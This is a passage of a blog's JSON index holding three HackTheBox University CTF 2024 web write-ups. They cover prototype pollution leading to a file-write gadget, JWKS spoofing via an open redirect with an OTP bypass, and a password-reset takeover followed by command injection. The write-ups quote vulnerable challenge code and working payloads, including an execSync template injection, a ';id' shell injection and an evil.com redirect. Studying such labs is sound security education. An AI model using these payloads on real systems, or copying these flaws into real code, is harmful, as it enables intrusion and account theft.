interesting format is \u0026quot;FranÃ§oise LefÃ¨vre\u0026quot;@example.com.\nAfter playing with the format for a while, \u0026quot;test@email.htb test\u0026quot;@interstellar.htb was working perfectly!\nThis is because email parsing disrepancy between email-address and nodemailer. nodemailer will convert the email to following format, which will interpret test@interstellar.htb as a alias, and set test@email.htb as the email address.\nCode can be retrieved in the email Prototype Pollution in one of the admin feature, it uses mergedeep function. Usually, function related with merge in javascript environment is vulnerable to prototype pollution.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 const mergedeep = require(\u0026#34;@christopy/mergedeep\u0026#34;); const editBountiesAPI = async (req, res) =\u0026gt; { const { ...bountyData } = req.body; try { const data = await BountyModel.findByPk(req.params.id, { attributes: [ \u0026#34;target_name\u0026#34;, \u0026#34;target_aliases\u0026#34;, \u0026#34;target_species\u0026#34;, \u0026#34;last_known_location\u0026#34;, \u0026#34;galaxy\u0026#34;, \u0026#34;star_system\u0026#34;, \u0026#34;planet\u0026#34;, \u0026#34;coordinates\u0026#34;, \u0026#34;reward_credits\u0026#34;, \u0026#34;reward_items\u0026#34;, \u0026#34;issuer_name\u0026#34;, \u0026#34;issuer_faction\u0026#34;, \u0026#34;risk_level\u0026#34;, \u0026#34;required_equipment\u0026#34;, \u0026#34;posted_at\u0026#34;, \u0026#34;status\u0026#34;, \u0026#34;image\u0026#34;, \u0026#34;description\u0026#34;, \u0026#34;crimes\u0026#34;, \u0026#34;id\u0026#34;, ], }); if (!data) { return res.status(404).json({ message: \u0026#34;Bounty not found\u0026#34; }); } const updated = mergedeep(data.toJSON(), bountyData); await data.update(updated); return res.json(updated); } catch (err) { console.log(err); return res.status(500).json({ message: \u0026#34;Error fetching data\u0026#34; }); } }; if we take a look at the source code, it was clear that the library doesn\u0026rsquo;t prevent for prototype pollution and assign value directly into the target object.\nsimple payload such as {\u0026quot;__proto__\u0026quot;: {\u0026quot;test\u0026quot;:\u0026quot;yey\u0026quot;}} can be used to trigger the vulnerability.\nFinding Gadget Usually, prototype pollution in CTF are combined with child_process function such as fork, execSync, exec, etc. However there\u0026rsquo;s none of them in the current application.\nIn order to find gadget to obtain either arbitrary file read or command execution, i decided to explore all library used in the application.\nOne of the interesting library is needle\n1 2 3 4 5 6 7 { \u0026#34;dependencies\u0026#34;: { \u0026#34;@christopy/mergedeep\u0026#34;: \u0026#34;^1.0.4\u0026#34;, \u0026#34;lodash\u0026#34;: \u0026#34;^4.17.21\u0026#34;, \u0026#34;needle\u0026#34;: \u0026#34;^3.3.1\u0026#34; } } The library is used to fetch data from web service. The usage is definitely eye catching because most of nodejs application uses axios to fetch pages from internet. So there must be something in the needle library.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const needle = require(\u0026#34;needle\u0026#34;); const fetchURL = async (url) =\u0026gt; { if (!url.startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.startsWith(\u0026#34;https://\u0026#34;)) { throw new Error(\u0026#34;Invalid URL: URL must start with http or https\u0026#34;); } const options = { compressed: true, follow_max: 0, }; return new Promise((resolve, reject) =\u0026gt; { needle.get(url, options, (err, resp, body) =\u0026gt; { if (err) { return reject(new Error(\u0026#34;Error fetching the URL: \u0026#34; + err.message)); } resolve(body); }); }); }; After reviewing the documentation and source code of needle, i found that output options is being used to save fetched content into system files.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 if (config.output \u0026amp;\u0026amp; resp.statusCode == 200) { // for some reason, simply piping resp to the writable stream doesn\u0026#39;t // work all the time (stream gets cut in the middle with no warning). // so we\u0026#39;ll manually need to do the readable/write(chunk) trick. var file = fs.createWriteStream(config.output); file.on(\u0026#39;error\u0026#39;, had_error); out.on(\u0026#39;end\u0026#39;, function() { if (file.writable) file.end(); }); file.on(\u0026#39;close\u0026#39;, function() { delete out.file; }) out.on(\u0026#39;readable\u0026#39;, function() { var chunk; while ((chunk = this.read()) !== null) { if (file.writable) file.write(chunk); // if callback was requested, also push it to resp.body if (resp.body) resp.body.push(chunk); } }) out.file = file; } so if we managed to pollute output options and call the fetchURL function, then we can perform arbitrary file write on the system.\nThis can be performed by calling /api/transmit using admin credentials after polluting the output options.\nafter obtaining arbitrary file write, we can try to\nOverwrite javascript files (need restart) Overwrite template files (without restart) DOS Additional bug, if we try to provide invalid url within fetchURL function, aparently the server will shut down.\nBecause the application using supervisord with autorestart=true, then this vulnerability can be used to restart the server after overwriting javascript files.\n1 2 3 4 5 6 7 8 9 [program:node] directory=/app command=node index.js autostart=true autorestart=true stdout_logfile=/dev/stdout stdout_logfile_maxbytes=0 stderr_logfile=/dev/stderr stderr_logfile_maxbytes=0 Exploitation in order to perform full attack, we need to:\nbypass email protection \u0026amp; privilege escalation perform prototype pollution to pollute output options overwrite either javascript or html files here i used following payload, stored in index.html files. The payload are obtained from Hacktricks\n1 {{range.constructor(\u0026#34;return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag.txt\u0026#39;)\u0026#34;)()}} trigger the updated code to gain code execution perform the same step for remote, and flag can be obtained :D\nFlag: HTB{f1nd1ng_0d4y_15_345Y_r1gh7!!?_970db3ce5022cd532606efeca829916c}\n","date":"2024-12-18T11:09:50.476Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-intergalactic-bounty/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-intergalactic-bounty/","title":"[HTB CTF University 2024] - Intergalactic Bounty"},{"content":"Web - Breaking Bank In the sprawling digital expanse of the Frontier Cluster, the Frontier Board seeks to cement its dominance by targeting the cornerstone of interstellar commerce: Cluster Credit, a decentralized cryptocurrency that keeps the economy alive. With whispers of a sinister 51% attack in motion, the Board aims to gain majority control of the Cluster Credit blockchain, rewriting transaction history and collapsing the fragile economy of the outer systems. Can you hack into the platform and drain the assets for the financialÂ controller?\nAnalysis We are given nodejs application. Flag can be obtained from checkFinancialControllerDrained method if CLCR coin balance of financial-controller@frontier-board.htb user is less than or equal 0. In other word, we need to drain the wallet of the user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { getBalancesForUser } from \u0026#39;../services/coinService.js\u0026#39;; import fs from \u0026#39;fs/promises\u0026#39;; const FINANCIAL_CONTROLLER_EMAIL = \u0026#34;financial-controller@frontier-board.htb\u0026#34;; /** * Checks if the financial controller\u0026#39;s CLCR wallet is drained * If drained, returns the flag. */ export const checkFinancialControllerDrained = async () =\u0026gt; { const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL); const clcrBalance = balances.find((coin) =\u0026gt; coin.symbol === \u0026#39;CLCR\u0026#39;); if (!clcrBalance || clcrBalance.availableBalance \u0026lt;= 0) { const flag = (await fs.readFile(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf-8\u0026#39;)).trim(); return { drained: true, flag }; } return { drained: false }; }; the checkFinancialControllerDrained method are called within dashboardRouter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { checkFinancialControllerDrained } from \u0026#39;../services/flagService.js\u0026#39;; export default async function dashboardRouter(fastify) { fastify.get(\u0026#39;/\u0026#39;, async (req, reply) =\u0026gt; { if (!req.user) { reply.status(401).send({ error: \u0026#39;Unauthorized: User not authenticated\u0026#39; }); return; } const { email } = req.user; if (!email) { reply.status(400).send({ error: \u0026#39;Email not found in token\u0026#39; }); return; } const { drained, flag } = await checkFinancialControllerDrained(); if (drained) { reply.send({ message: \u0026#39;Welcome to the Dashboard!\u0026#39;, flag }); return; } reply.send({ message: \u0026#39;Welcome to the Dashboard!\u0026#39; }); }); } This function will called when user access /api/dashboard.\n1 securedRoutes.register(dashboardRouter, { prefix: \u0026#39;/api/dashboard\u0026#39; }); ok, so how can we drain admin wallet? let\u0026rsquo;s analyze more.\nOpen Redirection After reading the source code, i found open redirection bug due to missing checking of url parameter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 export default async function analyticsRoutes(fastify) { fastify.get(\u0026#39;/redirect\u0026#39;, async (req, reply) =\u0026gt; { const { url, ref } = req.query; if (!url || !ref) { return reply.status(400).send({ error: \u0026#39;Missing URL or ref parameter\u0026#39; }); } // TODO: Should we restrict the URLs we redirect users to? try { await trackClick(ref, decodeURIComponent(url)); reply.header(\u0026#39;Location\u0026#39;, decodeURIComponent(url)).status(302).send(); } catch (error) { console.error(\u0026#39;[Analytics] Error during redirect:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to track analytics data.\u0026#39; }); } }); fastify.get(\u0026#39;/data\u0026#39;, async (req, reply) =\u0026gt; { const { start = 0, limit = 10 } = req.query; try { const analyticsData = await getAnalyticsData(parseInt(start), parseInt(limit)); reply.send(analyticsData); } catch (error) { console.error(\u0026#39;[Analytics] Error fetching data:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to fetch analytics data.\u0026#39; }); } }); } this route are defined with\n1 fastify.register(analyticsRoutes, { prefix: \u0026#39;/api/analytics\u0026#39; }); so we can perform open redirection using following url /api/analytics/redirect?ref=a\u0026amp;url=redirected.com\nJWKS Spoofing The application uses RS256 algorithm. This mean that JWT token will be signed using Private Key and validated using Public Key.\nThere\u0026rsquo;s a weakness in the token validation mechanism that lead to JWKS Spoofing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 export const verifyToken = async (token) =\u0026gt; { try { const decodedHeader = jwt.decode(token, { complete: true }); if (!decodedHeader || !decodedHeader.header) { throw new Error(\u0026#39;Invalid token: Missing header\u0026#39;); } const { kid, jku } = decodedHeader.header; if (!jku) { throw new Error(\u0026#39;Invalid token: Missing header jku\u0026#39;); } // TODO: is this secure enough? if (!jku.startsWith(\u0026#39;http://127.0.0.1:1337/\u0026#39;)) { throw new Error(\u0026#39;Invalid token: jku claim does not start with http://127.0.0.1:1337/\u0026#39;); } if (!kid) { throw new Error(\u0026#39;Invalid token: Missing header kid\u0026#39;); } if (kid !== KEY_ID) { return new Error(\u0026#39;Invalid token: kid does not match the expected key ID\u0026#39;); } let jwks; try { const response = await axios.get(jku); if (response.status !== 200) { throw new Error(`Failed to fetch JWKS: HTTP ${response.status}`); } jwks = response.data; } catch (error) { throw new Error(`Error fetching JWKS from jku: ${error.message}`); } if (!jwks || !Array.isArray(jwks.keys)) { throw new Error(\u0026#39;Invalid JWKS: Expected keys array\u0026#39;); } const jwk = jwks.keys.find((key) =\u0026gt; key.kid === kid); if (!jwk) { throw new Error(\u0026#39;Invalid token: kid not found in JWKS\u0026#39;); } if (jwk.alg !== \u0026#39;RS256\u0026#39;) { throw new Error(\u0026#39;Invalid key algorithm: Expected RS256\u0026#39;); } if (!jwk.n || !jwk.e) { throw new Error(\u0026#39;Invalid JWK: Missing modulus (n) or exponent (e)\u0026#39;); } const publicKey = jwkToPem(jwk); const decoded = jwt.verify(token, publicKey, { algorithms: [\u0026#39;RS256\u0026#39;] }); return decoded; } catch (error) { console.error(`Token verification failed: ${error.message}`); throw error; } }; it will try to decode jwt token, parse jku and check wether it starts with http://127.0.0.1:1337/. This approach is unsafe if open redirection is found in the application. Luckily, we already found open redirect vulnerability earlier.\nWe can use redirection to bypass the validation by using link such as http://127.0.0.1:1337/redirect?url=evil.com so it will fetch content from evil.com instead of 127.0.0.1. This way we can provide our own public key for token validation, while encrypting the token using our own private key.\nUsing this method, we can create arbitrary token and able to logged in as anyone in the site.\nOTP Bypass In order to perform transaction, application will try to perform several check\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 fastify.post( \u0026#39;/transaction\u0026#39;, { preHandler: [rateLimiterMiddleware(), otpMiddleware()] }, async (req, reply) =\u0026gt; { const { to, coin, amount } = req.body; const userId = req.user.email; try { if (!to || !coin || !amount) { return reply.status(400).send({ error: \u0026#34;Missing required fields\u0026#34; }); } const supportedCoins = await getSupportedCoins(); if (!supportedCoins.includes(coin.toUpperCase())) { return reply.status(400).send({ error: \u0026#34;Unsupported coin symbol.\u0026#34; }); } const parsedAmount = parseFloat(amount); if (isNaN(parsedAmount) || parsedAmount \u0026lt;= 0) { return reply.status(400).send({ error: \u0026#34;Amount must be a positive number.\u0026#34; }); } const userExists = await validateUserExists(to); if (!userExists) { return reply.status(404).send({ error: \u0026#34;Recipient user does not exist.\u0026#34; }); } if (userId === to) { return reply.status(400).send({ error: \u0026#34;Cannot perform transactions to yourself.\u0026#34; }); } const result = await transactionByEmail(to, userId, parseFloat(amount), coin.toUpperCase()); if (!result.success) { return reply.status(result.status).send({ error: result.error }); } reply.send(result); } catch (err) { console.error(\u0026#34;Transaction error:\u0026#34;, err); reply.status(err.status || 500).send({ error: err.error || \u0026#34;An unknown error occurred during the transaction.\u0026#34; }); } } ); It also uses two middleware before performing those checks.\nfrist one is rateLimiterMiddleware() which prevent bruteforce attemp by limiting only 5 request per minute.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { hsetField, hgetField, expireKey } from \u0026#39;../utils/redisUtils.js\u0026#39;; export const rateLimiterMiddleware = (limit = 5, windowInSeconds = 60) =\u0026gt; { return async (req, reply) =\u0026gt; { const userId = req.user.email; const redisKey = `rate-limit:${userId}`; let currentCount = await hgetField(redisKey, \u0026#39;count\u0026#39;); if (!currentCount) { currentCount = 1; await hsetField(redisKey, \u0026#39;count\u0026#39;, currentCount); await expireKey(redisKey, windowInSeconds); } else { currentCount = parseInt(currentCount, 10) + 1; await hsetField(redisKey, \u0026#39;count\u0026#39;, currentCount); } if (currentCount \u0026gt; limit) { reply.status(429).send({ error: \u0026#39;Too many requests. Please try again later.\u0026#39; }); return; } }; }; second is otpMiddleware() which will checks for user OTP in redis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { hgetField } from \u0026#39;../utils/redisUtils.js\u0026#39;; export const otpMiddleware = () =\u0026gt; { return async (req, reply) =\u0026gt; { const userId = req.user.email; const { otp } = req.body; const redisKey = `otp:${userId}`; const validOtp = await hgetField(redisKey, \u0026#39;otp\u0026#39;); console.log(validOtp) if (!otp) { reply.status(401).send({ error: \u0026#39;OTP is missing.\u0026#39; }); return } if (!validOtp) { reply.status(401).send({ error: \u0026#39;OTP expired or invalid.\u0026#39; }); return; } // TODO: Is this secure enough? if (!otp.includes(validOtp)) { reply.status(401).send({ error: \u0026#39;Invalid OTP.\u0026#39; }); return; } }; }; the otp are generated in the server and not given to user. The OTP is being generated for every one minute. So bruteforcing OTP is impossible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 export const generateOtp = () =\u0026gt; { return Math.floor(1000 + Math.random() * 9000).toString(); }; export const setOtpForUser = async (userId) =\u0026gt; { const otp = generateOtp(); const ttl = 60; await setHash(`otp:${userId}`, { otp, expiresAt: Date.now() + ttl * 1000 }); return otp; }; export const rotateOtps = async () =\u0026gt; { try { const userKeys = await getKeysByPattern(\u0026#39;user:*\u0026#39;); const rotatePromises = userKeys.map(async (userKey) =\u0026gt; { const userId = userKey.split(\u0026#39;:\u0026#39;)[1]; await setOtpForUser(userId); }); await Promise.all(rotatePromises); } catch (error) { console.error(\u0026#39;Error during OTP rotation:\u0026#39;, error); } }; export const safelyRotateOtps = async () =\u0026gt; { if (isRotating) { console.warn(\u0026#39;Previous OTP rotation is still in progress. Skipping this interval.\u0026#39;); return; } isRotating = true; try { await rotateOtps(); } catch (error) { console.error(\u0026#39;Error during OTP rotation:\u0026#39;, error); } finally { isRotating = false; } }; setInterval(safelyRotateOtps, 60000); However there\u0026rsquo;s weak validation mechanism for OTP verification because it uses the includes() method, which checks if the valid OTP is anywhere in the user\u0026rsquo;s input.\n1 2 3 4 if (!otp.includes(validOtp)) { reply.status(401).send({ error: \u0026#39;Invalid OTP.\u0026#39; }); return; } check test case below. Although input is not the same, but if the string is \u0026ldquo;included\u0026rdquo; in the full string, then it will return true.\nThis way, we can insert all possible combination of otp in single request, bypassing the validation.\nExploitation so here\u0026rsquo;s the full attack chain:\nBypass JWT to logged in as admin Bypass OTP to drain user balance Access the flag let\u0026rsquo;s register in the website first then login to the site We get valid JWT token in jwt localstorage. and we can also get sample of jwks.json value.\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;tgSoSdh8tbodjwpc4hBKBs_0nZG5Fktdnk6gx401f66G93ibpGthzCdaPpP4fABrImpjO3qg8roK7OKFoxj6DpYINgD1LxUqyaOO3Mm3ZoL_EgKKPzKgUmNZKwL-br6g9JvrlVNjAgG1xmL7csezJ3qaX2FJ21sihvHFa7EiGbydY4sOiEw8p24TfWAi8exaw2DaYeEyj-CoCzhxSzahZR5H9Rc5NnCkhVrK1TIaZAOCFAVs0WAC4BTxPS9MJjgPTEbec97VozzXXOu3c4qIrB0GYM8-gtzEWwqKHLi4uDoSwzeevjbzfbwOE0F_LOFHb7piQBH2dJ78y8rPtIXhYQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;8ff20cff-f538-4af6-97b8-fecd36505989\u0026#34; } ] } now let\u0026rsquo;s create pairs of public \u0026amp; private key. I\u0026rsquo;ll use https://mkjwk.org/\nfill all the required field and generate new key.\nServe public and private keypair set to your vps.\nnow convert the generated keypairs into PEM format. I\u0026rsquo;ll using https://8gwifi.org/. You can use Public and Private Keypair from previous site.\nnow modify token from jwt.io site change value of jwt in local storage and refresh. Now we\u0026rsquo;re logged in as admin.\nIt seems like we need to add friend first to be able to transfer money let\u0026rsquo;s add friend using our registered user login using our user, and accept friend request from admin now sent all CLCR coin to our user using following code, i can generate all combination of otp\n1 print(\u0026#39;\u0026#39;.join(f\u0026#34;{i:04d}\u0026#34; for i in range(10000))) now sent the modified request. it was accepted now if we go back to the dashboard, flag will be given perform same attack in the remote instances to obtain real flag :)\nFlag: HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_c1f72c32f8eb7a20278ef19559bd03ae}\n","date":"2024-12-18T11:07:50.476Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-breaking-bank/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-breaking-bank/","title":"[HTB CTF University 2024] - Breaking Bank"},{"content":"Web - Armaxis In the depths of the Frontier, Armaxis powers the enemyâ€™s dominance, dispatching weapons to crush rebellion. Fortified and hidden, it controls vital supply chains. Yet, a flaw whispers of opportunity, a crack to expose its secrets and disrupt their plans. Can you breach Armaxis and turn its power against tyranny?\nAnalysis We are given nodejs application and email service with address of test@wmail.htb.\nBased on the flag location in the source code, we need to at least obtain File Read or Code Execution within the application.\n1 COPY flag.txt /flag.txt After reading the source code, i found that parseMarkdown are using execSync with unsafe usage. This will allow us to obtain code execution if we manage to control the url value.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function parseMarkdown(content) { if (!content) return \u0026#39;\u0026#39;; return md.render( content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =\u0026gt; { try { const fileContent = execSync(`curl -s ${url}`); const base64Content = Buffer.from(fileContent).toString(\u0026#39;base64\u0026#39;); return `\u0026lt;img src=\u0026#34;data:image/*;base64,${base64Content}\u0026#34; alt=\u0026#34;Embedded Image\u0026#34;\u0026gt;`; } catch (err) { console.error(`Error fetching image from URL ${url}:`, err.message); return `\u0026lt;p\u0026gt;Error loading image: ${url}\u0026lt;/p\u0026gt;`; } }) ); } url value are obtain using regex, which will search for markdown image format such as:\n1 ![test](http://yooursite.com) this way, we can inject payload below to obtain code execution\n1 ![test](http://yooursite.com;id) parseMarkdown function was called within /weapons/dispath routes and only accessible for user with admin privileges.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 router.post(\u0026#34;/weapons/dispatch\u0026#34;, authenticate, async (req, res) =\u0026gt; { const { role } = req.user; if (role !== \u0026#34;admin\u0026#34;) return res.status(403).send(\u0026#34;Access denied.\u0026#34;); const { name, price, note, dispatched_to } = req.body; if (!name || !price || !note || !dispatched_to) { return res.status(400).send(\u0026#34;All fields are required.\u0026#34;); } try { const parsedNote = parseMarkdown(note); await dispatchWeapon(name, price, parsedNote, dispatched_to); res.send(\u0026#34;Weapon dispatched successfully.\u0026#34;); } catch (err) { console.error(\u0026#34;Error dispatching weapon:\u0026#34;, err); res.status(500).send(\u0026#34;Error dispatching weapon.\u0026#34;); } }); admin users were defined within database initialization below\n1 2 3 4 5 await runInsertUser( \u0026#34;admin@armaxis.htb\u0026#34;, `${crypto.randomBytes(69).toString(\u0026#34;hex\u0026#34;)}`, \u0026#34;admin\u0026#34;, ); To obtain admin credentials, we can perform an account takeover through the reset password feature. This feature allows users to reset their password using a token sent to their email. However, there is no validation to ensure that the token is assigned to the correct user. Additionally, we can supply any email address during the password reset process.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 router.post(\u0026#34;/reset-password/request\u0026#34;, async (req, res) =\u0026gt; { const { email } = req.body; if (!email) return res.status(400).send(\u0026#34;Email is required.\u0026#34;); try { const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); const resetToken = crypto.randomBytes(16).toString(\u0026#34;hex\u0026#34;); const expiresAt = Date.now() + 3600000; await createPasswordReset(user.id, resetToken, expiresAt); await transporter.sendMail({ from: \u0026#34;noreply@frontier.com\u0026#34;, to: email, subject: \u0026#34;Password Reset\u0026#34;, text: `Use this token to reset your password: ${resetToken}`, }); res.send(\u0026#34;Password reset token sent to your email.\u0026#34;); } catch (err) { console.error(\u0026#34;Error processing reset request:\u0026#34;, err); res.status(500).send(\u0026#34;Error processing reset request.\u0026#34;); } }); router.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!token || !newPassword || !email) return res.status(400).send(\u0026#34;Token, email, and new password are required.\u0026#34;); try { const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(\u0026#34;Invalid or expired token.\u0026#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); await updateUserPassword(user.id, newPassword); await deletePasswordReset(token); res.send(\u0026#34;Password reset successful.\u0026#34;); } catch (err) { console.error(\u0026#34;Error resetting password:\u0026#34;, err); res.status(500).send(\u0026#34;Error resetting password.\u0026#34;); } }); 1 2 3 4 5 6 7 8 9 async function getPasswordReset(token) { const query = `SELECT * FROM password_resets WHERE token = ? AND expires_at \u0026gt; ?`; try { const reset = await get(query, [token, Date.now()]); return reset; } catch (error) { throw error; } } Exploitation In order to takeover admin account, we need to:\nregister using test@email.htb perform reset password action obtain reset password token change email address upon form submission from test@email.htb into admin account admin@armaxis.htb now we can logged in into admin account the next step is to exploit code injection within dispatch weapon feature which will reflect in home page base64-decode the value will show the command output the last step is to read the flag in /flag.txt Flag : HTB{l00k0ut_f0r_m4rkd0wn_LF1_1n_w1ld!_ed3f0dc157df0cc33fc59f2854b4d9ee}\n","date":"2024-12-18T08:04:09.436Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-armaxis/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-armaxis/","title":"[HTB CTF University 2024] - Armaxis"}]